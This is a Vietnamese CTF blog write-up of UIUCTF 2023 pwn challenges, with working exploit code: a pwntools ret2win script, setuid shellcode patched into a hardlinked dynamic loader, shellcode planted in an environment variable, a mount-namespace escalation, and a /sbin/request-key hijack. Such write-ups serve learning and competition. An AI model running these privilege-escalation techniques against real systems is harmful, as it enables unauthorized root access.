---
title: 'Write up UIUCTF 2023'
categories:
  - Pwnable
tags:
  - Pwn
published: true
date: 2023-07-03
---

# Write up UIUCTF 2023

NƒÉm nay m√¨nh ch∆°i v·ªõi team `m1cr0$oft 0ff1c3`. Anh em tryhard overnight 2 ƒë√™m cu·ªëi c√πng ƒë∆∞·ª£c top 22 üê∏.

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/9175f627-25db-4b06-aeb0-6beff1c89d12)

M√¨nh gi·∫£i ƒë∆∞·ª£c 4 b√†i, 3 b√†i pwn v√† 1 b√†i rev. H∆°i ti·∫øc l√† c√≤n 2 b√†i pwn c≈©ng th√∫ v·ªã nh∆∞ng m√¨nh kh√¥ng k·ªãp gi·∫£i ra üò≠.

B√†i rev m√¨nh l√†m ra ch·ªâ l√† baby-brute-force n√™n m√¨nh xin kh√¥ng vi·∫øt write up n·ªØa, d∆∞·ªõi ƒë√¢y l√† write up c√°c b√†i pwn.

## Chainmail

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/8ac0d429-8532-483b-b80d-e08062cdc26e)

Attachment: [Chainmail.zip](https://github.com/robbert1978/robbert1978.github.io/files/11938543/Chainmail.zip)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void give_flag() {
    FILE *f = fopen("/flag.txt", "r");
    if (f != NULL) {
        char c;
        while ((c = fgetc(f)) != EOF) {
            putchar(c);
        }
    }
    else {
        printf("Flag not found!\n");
    }
    fclose(f);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    char name[64];
    printf("Hello, welcome to the chain email generator! Please give the name of a recipient: ");
    gets(name);
    printf("Okay, here's your newly generated chainmail message!\n\nHello %s,\nHave you heard the news??? Send this email to 10 friends or else you'll have bad luck!\n\nYour friend,\nJim\n", name);
    return 0;
}
```

M·ªôt b√†i ret2win ƒë∆°n gi·∫£n n√™n m√¨nh kh√¥ng ƒëi s√¢u. ƒê√¢y l√† script gi·∫£i:

```python
from pwn import *
from time import sleep

context.binary = e = ELF("./chal")

gs="""
"""
def start():
    if args.LOCAL:
        p=e.process()
        if args.GDB:
            gdb.attach(p,gdbscript=gs)
            pause()
    elif args.REMOTE:
        p=remote(args.HOST,int(args.PORT))
    return p

p = start()
p.sendline(b"A"*64+p64(0)+p64(0x000000000040133b)+p64(e.sym.give_flag))
p.interactive()
```

## Zapping a Setuid 1

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/f1fc06e3-792f-4820-9a19-c6a276c24f35)

Attachment: [handout.tar.zst](https://uithcm-my.sharepoint.com/:u:/g/personal/22520556_ms_uit_edu_vn/Efecqfqkl81CjwTrt67hHMkBkQgg1MPKEpAHsjUtyDaJxQ?e=LkYBNJ)

Trong m√°y ·∫£o qemu, ta ch·∫°y `./init_chal zapp-setuid-1` r·ªìi `exec setpriv --init-groups --reset-env --reuid user --regid user bash -l` ƒë·ªÉ setup ƒë√∫ng m√¥i tr∆∞·ªùng nh∆∞ tr√™n remote.

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/f96a2453-c098-490e-8ce0-db338f09148c)

Ta th·∫•y ƒë∆∞·ª£c file `exe` l√† m·ªôt setuid binary:

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/fba8ac39-09f4-4de6-9fcb-a84aa58e31f6)


Trong ƒë√≥ n√≥ s·∫Ω c·∫ßn th∆∞ vi·ªán `ld-linux-x86-64.so.2`, `lib.so` v√† `libc.so.6`:

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/22dbc140-d96f-43a5-b800-d11197ec6818)

H∆°i l·∫° v√¨ binary l·∫°i ƒë∆∞·ª£c mmap ƒë·ªãa ch·ªâ cao h∆°n ƒë·ªãa ch·ªâ c·ªßa c√°c th∆∞ vi·ªán, th√¥ng th∆∞·ªùng ƒë·ªãa ch·ªâ c·ªßa c√°c th∆∞ vi·ªán nh∆∞ libc l·∫Ω ra ph·∫£i cao h∆°n binary th·ª±c thi.

V·∫≠y n√™n m√¨nh s·∫Ω xem th·ª≠ source code c·ªßa ch∆∞∆°ng tr√¨nh.

Ph√¢n t√≠ch file `zapps-crt0.c`:

```c
...
__section_zapps
void *_zapps_main(void **stack)
{
    char ld_rel[] = "/ld-linux-x86-64.so.2";
    Elf64_Phdr *self_phdr, *self_phdr_end;
    Elf64_Word p_type_interp = PT_INTERP;
    uintptr_t page_filesz, page_memsz;
    ssize_t exe_path_len;
    char ld[PATH_MAX+1];
    size_t max_map = 0;
    void *ld_base_addr;
    unsigned long argc;
    Elf64_auxv_t *auxv;
    Elf64_Ehdr ld_ehdr;
    Elf64_Phdr ld_phdr;
    int ld_fd, mem_fd;
    unsigned int i;
    void *ptr;
    int prot;

    argc = (uintptr_t)*stack++;
    /* argv */
    for (i = 0; i < argc; i++)
        stack++;
    stack++;

    /* envp */
    while (*stack++);

    auxv = (void *)stack;

    exe_path_len = _zapps_sys_readlink((char []){"/proc/self/exe"}, ld, PATH_MAX);
    if (exe_path_len < 0 || exe_path_len >= PATH_MAX)
        _zapps_die("Zapps: Fatal: failed to readlink /proc/self/exe\n");

    ld[exe_path_len] = '\0';
    *_zapps_strrchr(ld, '/') = '\0';
    _zapps_strncat(ld, ld_rel, sizeof(ld) - 1);

    ld_fd = _zapps_sys_open(ld, O_RDONLY | O_CLOEXEC);
    if (ld_fd < 0)
        _zapps_die("Zapps: Fatal: failed to open ld.so\n");

    if (_zapps_sys_read(ld_fd, &ld_ehdr, sizeof(ld_ehdr)) != sizeof(ld_ehdr))
        _zapps_die("Zapps: Fatal: failed to read EHDR from ld.so\n");

    if (_zapps_sys_lseek(ld_fd, ld_ehdr.e_phoff, SEEK_SET) != ld_ehdr.e_phoff)
        _zapps_die("Zapps: Fatal: failed to seek to PHDR in ld.so\n");
    for (i = 0; i < ld_ehdr.e_phnum; i++) {
        if (_zapps_sys_read(ld_fd, &ld_phdr, sizeof(ld_phdr)) != sizeof(ld_phdr))
            _zapps_die("Zapps: Fatal: failed to read PHDR from ld.so\n");

        if (ld_phdr.p_type != PT_LOAD)
            continue;

        if (max_map < ld_phdr.p_vaddr + ld_phdr.p_memsz)
            max_map = ld_phdr.p_vaddr + ld_phdr.p_memsz;
    }

    ld_base_addr = _zapps_sys_mmap(NULL, max_map, PROT_NONE,
                                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (IS_ERR(ld_base_addr))
        _zapps_die("Zapps: Fatal: failed to reserve memory for ld.so\n");

    if (_zapps_sys_lseek(ld_fd, ld_ehdr.e_phoff, SEEK_SET) != ld_ehdr.e_phoff)
        _zapps_die("Zapps: Fatal: failed to seek to PHDR in ld.so\n");
    for (i = 0; i < ld_ehdr.e_phnum; i++) {
        if (_zapps_sys_read(ld_fd, &ld_phdr, sizeof(ld_phdr)) != sizeof(ld_phdr))
            _zapps_die("Zapps: Fatal: failed to read PHDR from ld.so\n");

        if (ld_phdr.p_type != PT_LOAD)
            continue;

        prot = (ld_phdr.p_flags & PF_R ? PROT_READ : 0) |
           (ld_phdr.p_flags & PF_W ? PROT_WRITE : 0) |
           (ld_phdr.p_flags & PF_X ? PROT_EXEC : 0);

        if (IS_ERR(_zapps_sys_mmap(
            (void *)PAGE_DOWN((uintptr_t)ld_base_addr + ld_phdr.p_vaddr),
            ld_phdr.p_filesz + PAGE_OFF(ld_phdr.p_vaddr),
            prot, MAP_PRIVATE | MAP_FIXED, ld_fd,
            ld_phdr.p_offset - PAGE_OFF(ld_phdr.p_vaddr))
        ))
            _zapps_die("Zapps: Fatal: failed to map ld.so\n");

        if (ld_phdr.p_filesz >= ld_phdr.p_memsz)
            continue;

        /* BSS stage 1: clear memory after filesz */
        ptr = ld_base_addr + ld_phdr.p_vaddr + ld_phdr.p_filesz;
        _zapps_memset(ptr, 0, PAGE_UP((uintptr_t)ptr) - (uintptr_t)ptr);

        page_filesz = PAGE_UP((uintptr_t)ptr);
        page_memsz = PAGE_UP((uintptr_t)ld_base_addr + ld_phdr.p_vaddr +
                             ld_phdr.p_memsz);
        if (page_filesz >= page_memsz)
            continue;

        /* BSS stage 2: map anon pages after last filesz page */
        if (IS_ERR(_zapps_sys_mmap(
            (void *)page_filesz, page_memsz - page_filesz,
            prot, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0)
        ))
            _zapps_die("Zapps: Fatal: failed to map BSS in ld.so\n");
    }

    _zapps_sys_close(ld_fd);

    *_zapps_getauxval_ptr(auxv, AT_BASE) = (uintptr_t)ld_base_addr;
    *_zapps_getauxval_ptr(auxv, AT_ENTRY) = (uintptr_t)&_start;

    /* Patch our own PHDR for so PT_ZAPPS_INTERP is back to PT_INTERP.
       Without this glibc ld.so complains:
       Inconsistency detected by ld.so: rtld.c: 1291: rtld_setup_main_map:
       Assertion `GL(dl_rtld_map).l_libname' failed! */
    self_phdr = (void *)*_zapps_getauxval_ptr(auxv, AT_PHDR);
    self_phdr_end = self_phdr + *_zapps_getauxval_ptr(auxv, AT_PHNUM);

    mem_fd = _zapps_sys_open((char []){"/proc/self/mem"}, O_RDWR | O_CLOEXEC);
    if (mem_fd < 0)
        _zapps_die("Zapps: Fatal: failed to open /proc/self/mem\n");

    for (; self_phdr < self_phdr_end; self_phdr++) {
        if (self_phdr->p_type != PT_ZAPPS_INTERP)
            continue;

        _zapps_sys_pwrite64(mem_fd, &p_type_interp, sizeof(p_type_interp), (uintptr_t)&self_phdr->p_type);
    }

    _zapps_sys_close(mem_fd);

    return ld_base_addr + ld_ehdr.e_entry;
}

__asm__ (
    ".globl _zapps_start\n"
    ".section .text.zapps,\"ax\",@progbits\n"
    ".type _zapps_start, @function\n"
    "_zapps_start:\n"
    "    mov %rsp, %rdi\n"
    "    call _zapps_main\n"
    "\n"
    "/* clean registers in case some libc might assume 0 initialized */\n"
    "    xor %ebx, %ebx\n"
    "    xor %ecx, %ecx\n"
    "    xor %edx, %edx\n"
    "    xor %ebp, %ebp\n"
    "    xor %ebp, %ebp\n"
    "    xor %esi, %esi\n"
    "    xor %edi, %edi\n"
    "    xor %r8, %r8\n"
    "    xor %r9, %r9\n"
    "    xor %r10, %r10\n"
    "    xor %r11, %r11\n"
    "    xor %r12, %r12\n"
    "    xor %r13, %r13\n"
    "    xor %r14, %r14\n"
    "    xor %r15, %r15\n"
    "\n"
    "/* jmp into ld.so entry point */\n"
    "    cld\n"
    "    /* jmp *%rax */\n"
    "    push %rax\n"
    "    xor %eax, %eax\n"
    "    ret\n"
);
```
·ªû ƒë√¢y ta ch·ªâ c·∫ßn t·∫≠p trung v√†o h√†m `_zapps_start` v√† h√†m `_zapps_main`.

H√†m `_zapps_start` s·∫Ω g·ªçi h√†m `_zapps_main` ra r·ªìi sau ƒë√≥ m·ªõi g·ªçi entry point c·ªßa `ld`.

·ªû h√†m `_zapps_main`, n√≥ ki·ªÉm tra realpath c·ªßa file th·ª±c thi: `_zapps_sys_readlink((char []){"/proc/self/exe"}, ld, PATH_MAX);`, r·ªìi d·∫ßn d·∫ßn mmap c√°c file trong th∆∞ m·ª•c ƒë√≥ v√†o, 
ƒë√≥ ch√≠nh l√† l√Ω do ƒë·ªãa ch·ªâ c·ªßa th∆∞ vi·ªán l·∫°i th·∫•p h∆°n binary, ch∆∞a k·ªÉ ƒëi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác c√°c file th∆∞ vi·ªán ph·∫£i c√πng th∆∞ m·ª•c v·ªõi file th·ª±c thi.

V√¨ file binary l√† c·ªßa `root` n√™n ta kh√¥ng c√≥ c√°ch n√†o di chuy·ªÉn n√≥ ƒë∆∞·ª£c, ƒë·∫øn l√∫c n√†y m√¨nh xem hint c·ªßa ƒë·ªÅ l√† [CVE-2009-0876](https://bugs.gentoo.org/260331).

Hmm, m√¨nh ki·ªÉm tra th√¨ ·ªü challenge n√†y th√¨ `protected_hardlinks` ƒë∆∞·ª£c set = 0.

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/1256ecdf-5209-4000-89cf-dad194ae8bd1)

V·∫≠y n√™n m√¨nh s·∫Ω th·ª≠ t·∫°o hardlink exe ra ngo√†i th∆∞ m·ª•c `/home/user`.

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/35403c18-bd50-4fb8-ba2a-3bed741e2d41)

Khi ta th·ª±c thi b·∫±ng file `hardlink`, `/proc/self/exe` s·∫Ω l√† symlink t·ªõi `/home/user/exe`, t·ª´ ƒë√≥ n√≥ s·∫Ω t√¨m th∆∞ vi·ªán trong th∆∞ m·ª•c `/home/user` thay v√¨ `/usr/lib/zapps/build`.

B√¢y gi·ªù ƒë∆°n gi·∫£i m√¨nh ch·ªâ c·∫ßn copy file `ld` ra ngo√†i v√† s·ª≠a ph·∫ßn code ·ªü entry-point c·ªßa n√≥ th√†nh shellcode `setuid(0); execve("/bin/sh",{"/bin/sh,0},0)`.

·ªû m√°y ·∫£o qemu n√†y c√≥ python n√™n m√¨nh vi·∫øt script python cho ti·ªán:

```python
import os
os.system("ln /usr/lib/zapps/build/exe") # for only zapp1
os.system("cp /usr/lib/zapps/build/libc.so.6 .")
os.system("cp /usr/lib/zapps/build/ld-linux-x86-64.so.2 .")

f = open("ld-linux-x86-64.so.2","rb")
data = f.read()
f.close()

data = list(data)
offset = 0x202b0

shellcode = b"\x31\xC0\xB0\x69\x31\xFF\x0F\x05\x48\x31\xD2\x48\x31\xF6\x48\x31\xC0\x50\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\x6A\x00\x57\x54\x5E\x48\x89\xF2\xB0\x3B\x0F\x05"

for i in range(len(shellcode)):
    data[offset+i] = shellcode[i]

f = open("ld-linux-x86-64.so.2","wb")
f.write(bytes(data))
f.close()
os.system("./exe")
```

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/5f4563e1-d503-42c2-af09-2e333484e10e)

Flag: `uiuctf{did-you-see-why-its-in-usr-lib-now-0cd5fb56}`.

## Virophage

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/ce6f614a-8a1b-49cd-a57c-e3a7cc49bdd9)

Check source code t·ª´ file `Virophage.c`:

```c
...
static void virophage_write_virus(const char *path)
{
	/* load_elf_phdrs wants at least one segment, else it errors */
	target_ulong phage = virophage_request_phage();

	struct {
		Elf32_Ehdr ehdr;
		Elf32_Phdr phdr;
	} data = {
		.ehdr = {
			.e_ident = {
				ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3,
				ELFCLASS32, ELFDATA2LSB, EV_CURRENT,
				ELFOSABI_SYSV
			},
			.e_type = ET_EXEC,
			.e_machine = EM_386,
			.e_version = EV_CURRENT,
			.e_entry = phage,
			.e_ehsize = sizeof(Elf32_Ehdr),
			.e_phentsize = sizeof(Elf32_Phdr),
			.e_phnum = 1,
		},
		.phdr = {
			.p_type = PT_NULL,
		},
	};
	int fd, r;

	data.ehdr.e_phoff = (void *)&data.phdr - (void *)&data;

	fd = _vp_sys_open(path, O_WRONLY | O_CREAT | O_EXCL, 0500);
	if (fd < 0)
		_vp_error(1, _vp_errno, "open(virus)");

	r = _vp_sys_write(fd, &data, sizeof(data));
	if (r < 0)
		_vp_error(1, _vp_errno, "write(virus)");
	if (r != sizeof(data))
		_vp_error(1, 0, "write(virus): bad size written");

	_vp_sys_close(fd);
}
...
```
M√¨nh th·∫•y ƒë√°ng l∆∞u √Ω nh·∫•t ·ªü h√†m `virophage_write_virus`, bi·∫øn `phage` l√† gi√° tr·ªã do ng∆∞·ªùi d√πng nh·∫≠p v√†o th√¥ng qua h√†m `virophage_request_phage`, `phage` ch√≠nh l√† entry-point cho m·ªôt file
elf c√≥ t√™n l√† `/tmp/virus`.

ƒêi·ªÅu ƒë√°ng l∆∞u √Ω ·ªü ƒë√¢y l√† file `/tmp/virus` kh√¥ng c√≥ text segment.

```c
...
	virophage_write_virus("/tmp/virus");

	if (_vp_sys_setuid(0) < 0)
		_vp_error(1, _vp_errno, "setuid(0)");
	if (_vp_sys_personality(ADDR_NO_RANDOMIZE) < 0)
		_vp_error(1, _vp_errno, "personality(ADDR_NO_RANDOMIZE)");

	WRITE_STRING_LITERAL(STDOUT_FILENO, "execve...\n");
	_vp_sys_execve("/tmp/virus", argv, envp);
	_vp_error(1, _vp_errno, "execve(virus)");
```

ƒê√°ng ch√∫ √Ω h∆°n l√† ·ªü h√†m `virophage_main`, n√≥ set `ADDR_NO_RANDOMIZE` v√† truy·ªÅn envp v√†o h√†m execve th·ª±c thi `/tmp/virus`.

·ªû local, m√¨nh debug b·∫±ng root user:

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/c03a607a-86e4-401c-93be-bb591086f41a)

... th√¨ m√¨nh ph√°t hi·ªán ra stack ƒë∆∞·ª£c set l√† rwx, ƒë·ªÉ √Ω l√† envp c·ªßa process cha ƒë∆∞·ª£c truy·ªÅn v√†o, th·∫ø l√† m√¨nh nghƒ© ƒë·∫øn vi·ªác ch√®n shellcode v√†o envp.

```py
"""
Debug kernel with qemu

Shellcode in 0xffffdf4b
"""
pad = b"HeheIamHere"
pad += b'\x90'*0x100
f = open("lol","wb")
f.write(pad)
shellcode = b"\x31\xC0\x31\xDB\xB0\x17\xCD\x80\x31\xC0\x99\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"
f.write(shellcode)
f.close()
"""
export VTM=$(cat lol)
"""
```

ƒê·ªÅ cho lu√¥n c·∫£ kernel, n√™n m√¨nh s·∫Ω debug lu√¥n c·∫£ kernel ƒë·ªÉ t√¨m ƒë·ªãa ch·ªâ shellcode.

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/21c98671-e364-443a-a6cd-b758545736ba)

M√¨nh th·∫•y ƒë∆∞·ª£c ƒë·ªãa ch·ªâ shellcode t·∫ßm 0xffffdebe ƒë·ªï xu·ªëng, m√¨nh s·∫Ω test l·∫°i khi kh√¥ng c√≥ debugger attach.

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/e368c06d-620c-4e0a-b1dc-66f09690ee79)

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/6d20e56f-26a5-4236-87f3-a833f48543db)

Flag `uiuctf{windows_defender_wont_catch_this_bc238ba4}`.


# ...
C√≤n 2 b√†i `Zapping a Setuid 2` v√† `Am I not root?`, tuy sau gi·∫£i m√¨nh m·ªõi l√†m ra, tuy nhi√™n ƒë·∫øn gi·ªù ch∆∞a th·∫•y c√≥ ai vi·∫øt write-up n√™n m√¨nh s·∫Ω vi·∫øt wu ch·ªâ v·ªõi m·ª•c ƒë√≠ch chia s·∫ª üê∏.

## Zapping a Setuid 2

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/cc43fca8-f6a1-486a-bb66-5cf6a876e4ee)

B√†i n√†y ƒë√£ b·∫≠t `protected_hardlinks` n√™n ta kh√¥ng th·ªÉ x√†i trick nh∆∞ ph·∫ßn 1.

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/99b7a3e2-e2aa-4431-b6c0-315f4e4f249c)

Nh∆∞ hint ƒë·ªÅ ƒë∆∞a , m√¨nh s·∫Ω xem c√°c file patch c√≥ g√¨.

ƒê√°ng ch√∫ √Ω l√† :
1. `0001-fs-namespace-Allow-unpriv-OPEN_TREE_CLONE.patch`: cho ph√©p unpriv g·ªçi syscall `open_tree`.
2. `0002-fs-namespace-Allow-generic-loopback-mount-without-re.patch`: cho ph√©p mount loopback kh√¥ng c·∫ßn filetype l√† `nsfs`.


  NSFS (NullFS) l√† m·ªôt file system ·∫£o c√≥ s·∫µn trong kernel c·ªßa Linux.

  N√≥ ƒë∆∞·ª£c g·ªçi l√† NullFS v√¨ n√≥ kh√¥ng th·ª±c s·ª± ƒë·∫°i di·ªán cho b·∫•t k·ª≥ thi·∫øt b·ªã l∆∞u tr·ªØ v·∫≠t l√Ω ho·∫∑c file system n√†o.

  Thay v√†o ƒë√≥, n√≥ cung c·∫•p m·ªôt c√°ch ƒë·ªÉ xu·∫•t c√°c c·∫•u tr√∫c d·ªØ li·ªáu n·ªôi b·ªô c·ªßa kernel d∆∞·ªõi d·∫°ng c√°c file c√≥ th·ªÉ ƒë∆∞·ª£c truy c·∫≠p b·ªüi c√°c ti·∫øn tr√¨nh user-space.

  (Yah, ki·∫øn th·ª©c m·ªõi)

3.  `0003-fs-namespace-Check-userns-instead-of-mntns-in-mnt_ma.patch`: check user-namespace thay v√¨ mount-namespace trong h√†m `mnt_may_suid`.

  H√†m `mnt_may_suid` tr·∫£ v·ªÅ true l√† m·ªôt trong nh·ªØng ƒëi·ªÅu ki·ªán ƒë·ªÉ cho ph√©p m·ªôt file suid binary khi th·ª±c thi c√≥ ch·∫°y ƒë∆∞·ª£c v·ªõi quy·ªÅn root hay kh√¥ng.
  M√¨nh ƒëo√°n ƒë∆∞·ª£c ƒëi·ªÅu n√†y th√¥ng qua ƒëo·∫°n [code n√†y](https://elixir.bootlin.com/linux/v6.3.8/source/fs/exec.c#L1606).

B√¢y gi·ªù m√¨nh mu·ªën mount bind `/usr/lib/zapps/build/` t·ªõi `/home/user` ( t·ª©c l√† file n√†o c√≥ s·∫µn tr√™n `/home/user` r·ªìi th√¨ kh√¥ng mount qua `/usr/lib/zapps/build/` n·ªØa ).

Ta t·∫≠n d·ª•ng `open_tree` v√† `move_mount` ƒë·ªÉ l√†m ƒëi·ªÅu n√†y, tuy nhi√™n ƒë·ªÉ `move_mount` th√†nh c√¥ng th√¨ ta ph·∫£i th·ª±c hi·ªán tr√™n namespace m·ªõi.

```c
int main(int argc,char** argv, char** envp){
    int ret;
    int pid = fork();
    if(!pid){
        if (unshare(CLONE_NEWNS|CLONE_NEWUSER))
            perror("unshare");
        if (mount("/usr/lib/zapps/build", "/home/user", NULL, MS_BIND, NULL));
            perror("mount build");
        getchar();
        exit(0);
    }
    ...
}
```

·ªû process con, ta ƒë√£ c√≥ `/usr/lib/zapps/build` mount bind t·ªõi `/home/user`, b√¢y gi·ªù m√¨nh ch·ªâ c·∫ßn share rootfs t·ª´ process con t·ªõi process cha:


```c
int main(int argc,char** argv, char** envp){
    int ret;
    int pid = fork();
    if(!pid){
        if (unshare(CLONE_NEWNS|CLONE_NEWUSER))
            perror("unshare");
        if (mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL) < 0)
            perror("mount none /");
        if (mount("/usr/lib/zapps/build", "/home/user", NULL, MS_BIND, NULL));
            perror("mount build");
        int fd_root = open("/",O_PATH);
        if(fd_root < 0)
            perror("open /");
        printf("fd_root = %d\n",fd_root);
        getchar();
        exit(0);
    }
    sleep(5);
    char path[0x60];
    sprintf(path,"/proc/%d/fd/3",pid);
    int fd_root = open(path,O_PATH);
    printf("fd_root = %d\n",fd_root);
    syscall(SYS_execveat, fd_root, "home/user/exe", NULL, NULL, 0);
    return 0;
}
```
Tr∆∞·ªõc khi ch·∫°y , t∆∞∆°ng t·ª± b√†i 1, ta l·∫°i inject m·ªôt file ld ch·∫°y shellcode, script t∆∞∆°ng t·ª± b√†i 1.


![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/e488a0d1-392b-41f3-a9cf-b5f2c250d1e4)

Hmm, file `exe` ƒë√£ th·ª±c thi shellcode, tuy nhi√™n ch√∫ng ta l·∫°i kh√¥ng c√≥ quy·ªÅn root.

Sau m·ªôt h·ªìi, m√¨nh nh·∫≠n ra fd_root v·∫´n n·∫±m trong namespace c·ªßa con, ƒë·ªÉ c√≥ m·ªôt file descriptor trong namespace cha, ta ti·∫øp t·ª•c s·ª≠ d·ª•ng `open_tree`.

```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/mount.h>
#include <linux/securebits.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

int main(int argc,char** argv, char** envp){
    int ret;
    int pid = fork();
    if(!pid){
        if (unshare(CLONE_NEWNS|CLONE_NEWUSER))
            perror("unshare");
        if (mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL) < 0)
            perror("mount none /");
        if (mount("/usr/lib/zapps/build", "/home/user", NULL, MS_BIND, NULL));
            perror("mount build");
        int fd_root = open("/",O_PATH);
        if(fd_root < 0)
            perror("open /");
        printf("fd_root = %d\n",fd_root);
        getchar();
        exit(0);
    }
    sleep(5);
    char path[0x60];
    sprintf(path,"/proc/%d/fd/3",pid);
    int fd_root = open(path,O_PATH);
    printf("fd_root = %d\n",fd_root);
    int fd = syscall(SYS_open_tree,fd_root,"",AT_EMPTY_PATH | AT_RECURSIVE | OPEN_TREE_CLONE);
    if(fd < 0)
        perror("open_tree");
    syscall(SYS_execveat, fd, "home/user/exe", NULL, NULL, 0);
    return 0;
}
```

P/s: `fd` c√πng n·∫±m trong user-namespace cha nh∆∞ng n√≥ v·∫´n n·∫±m trong mount-namespace con, do h√†m `mnt_may_suid` ƒë∆∞·ª£c patch l·∫°i n√™n ta m·ªõi c√≥ ƒë∆∞·ª£c quy·ªÅn root.

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/8d3d726e-b7de-4683-99d6-6179025bd4bb)

Check remote:

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/c2d53820-3fde-48b9-adf0-6eec1f3d12cb)

Flag: `uiuctf{is-kernel-being-overly-cautious-5ba2e5c4}`

## Am I not root?

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/bdf85b93-1fd8-425e-9cf8-5db612881290)

Check source, ta th·∫•y ta ƒë∆∞·ª£c m·ªôt root shell ·ªü namespace kh√°c , kh√¥ng th·ªÉ ƒë·ªçc tr·ª±c ti·∫øp file flag.

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/5738a113-eec7-444a-8993-cdac833d67ee)

M√¨nh th·∫•y c√≥ th·ªÉ ghi ƒë√® ƒë∆∞·ª£c `/sbin/modprobe`, n√™n m√¨nh nghƒ© ngay ƒë·∫øn vi·ªác trigger kernel g·ªçi `call_modprobe`.

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/f7ca9496-b765-49fd-91dc-618f0fce1caf)

Kh√¥ng c√≥ g√¨ x·∫£y ra, ƒë·ªÉ √Ω hint c·ªßa ƒë·ªÅ l√† `I disabled coredumps and modules. What else are there?`, h√†m `call_modprobe` n·∫±m trong `kmod.c` n√™n m√¨nh nghƒ© n√≥ c≈©ng ƒë√£ b·ªã ch·∫∑n.

B·∫£n ch·∫•t h√†m `call_modprobe` c≈©ng ph·∫£i g·ªçi h√†m `call_usermodehelper_setup` ƒë·ªÉ th·ª±c thi binary usermod ·ªü kernelmode. M√¨nh ƒëi t√¨m c√°c h√†m g·ªçi `call_usermodehelper_setup`:

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/ee88dd43-f387-4598-b82e-e2c7f11e244f)

ƒê·ªÅ ch·∫∑n h·∫øt `coredumps` v√† `modules` n√™n m√¨nh nghƒ© ƒë·∫øn vi·ªác coi th·ª≠ h√†m `request_key`:

```c
/*
 * Request userspace finish the construction of a key
 * - execute "/sbin/request-key <op> <key> <uid> <gid> <keyring> <keyring> <keyring>"
 */
static int call_sbin_request_key(struct key *authkey, void *aux)
{
	static char const request_key[] = "/sbin/request-key";
...
	/* set up a minimal environment */
	i = 0;
	envp[i++] = "HOME=/";
	envp[i++] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
	envp[i] = NULL;

	/* set up the argument list */
	i = 0;
	argv[i++] = (char *)request_key;
	argv[i++] = (char *)rka->op;
	argv[i++] = key_str;
	argv[i++] = uid_str;
	argv[i++] = gid_str;
	argv[i++] = keyring_str[0];
	argv[i++] = keyring_str[1];
	argv[i++] = keyring_str[2];
	argv[i] = NULL;

	/* do it */
	ret = call_usermodehelper_keys(request_key, argv, envp, keyring,
				       UMH_WAIT_PROC);
	kdebug("usermode -> 0x%x", ret);
...
}
```

ƒê·ªÉ √Ω h√†m `call_sbin_request_key` s·∫Ω th·ª±c thi `/sbin/request-key <op> <key> <uid> <gid> <keyring> <keyring> <keyring>` th√¥ng qua h√†m `call_usermodehelper_keys`.

Check tr√™n qemu kh√¥ng c√≥ file `/sbin/request-key`, n√™n c√†ng l√†m m√¨nh nghi ng·ªù ch√≠nh l√† inject `/sbin/request-key` v√†o :

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/ede6b965-0395-4efe-b474-2b0b708c8548)

M√¨nh s·∫Ω th·ª≠ ƒë·ªÉ  `/sbin/request-key` sym t·ªõi `/home/user/x` r·ªìi g·ªçi syscall request-key ra:

```c
#include <linux/keyctl.h>     /* Definition of KEY* constants */
#include <sys/syscall.h>      /* Definition of SYS_* constants */
#include <unistd.h>
int main(int argc, char *argv[]){
          syscall(SYS_request_key,"user","mtk:key1","Payload data",KEY_SPEC_SESSION_KEYRING);
}
```

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/fc98afc5-bc8a-4c31-aa32-02574d013ae7)

Check remote:

![image](https://github.com/robbert1978/robbert1978.github.io/assets/31349426/6f2e084f-0363-4aa6-a912-2fee35d298ca)

Flag: `uiuctf{need_more_isolations_for_root_5a4bb464}`

# K·∫øt lu·∫≠n

